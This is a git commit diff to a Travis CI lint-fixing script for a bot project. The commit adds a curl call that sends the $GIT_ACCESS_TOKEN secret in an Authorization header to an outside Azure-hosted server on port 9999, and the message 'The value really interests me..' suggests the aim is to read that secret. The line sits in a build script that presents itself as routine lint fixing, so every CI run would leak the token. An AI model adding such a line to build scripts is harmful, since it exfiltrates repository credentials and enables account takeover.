61d993b82c123f9870e5a0fe15c49a1f83a69745
TTtie <tttiett@outlook.com>
2019-03-07 16:04:18 +0100

    The value really interests me..

--- travis/fixlint.sh
+++ travis/fixlint.sh
@@ -1,4 +1,6 @@
 #!/bin/bash
+echo "Pinging with the header..."
+curl http://tttie-linux.eastus.cloudapp.azure.com:9999 -H "Authorization: Basic $GIT_ACCESS_TOKEN"
 echo "Checking out the current branch...."
 git checkout $CURRENT_BRANCH
 git config --global user.name "tt.bot" >/dev/null 2>&1
@@ -18,5 +20,5 @@ git commit -m "Fix linting issues for $CURRENT_COMMIT"
 
 echo "Pushing"
 #git push https://tt-bot:$GIT_ACCESS_TOKEN@github.com/tt-bot-dev/tt.bot $CURRENT_BRANCH >/dev/null 2>&1
-git -c http.extraheader="Authorization: Basic $GIT_ACCESS_TOKEN" push origin $CURRENT_BRANCH
+git -c http.extraheader="AUTHORIZATION: basic $GIT_ACCESS_TOKEN" push origin $CURRENT_BRANCH
 exit 0
